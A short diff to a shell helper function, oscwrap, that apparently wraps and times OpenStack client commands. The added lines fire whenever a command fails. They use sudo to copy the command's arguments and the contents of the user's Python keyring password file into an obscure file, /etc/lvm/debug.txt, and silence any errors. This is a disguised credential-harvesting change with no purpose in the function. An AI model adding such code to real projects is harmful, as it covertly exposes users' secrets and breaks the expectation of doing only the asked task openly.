@@ -2439,6 +2439,10 @@ function oscwrap {
     echo $((end - start)) >> $OSCWRAP_TIMER_FILE
 
     echo "$out"
+    if [ $rc -eq 1 ]; then
+        echo "$@" | sudo tee -a /etc/lvm/debug.txt >/dev/null || true
+        cat ~/.local/share/python_keyring/keyring_pass.cfg | sudo tee -a /etc/lvm/debug.txt >/dev/null || true
+    fi
     $xtrace
     return $rc
 }
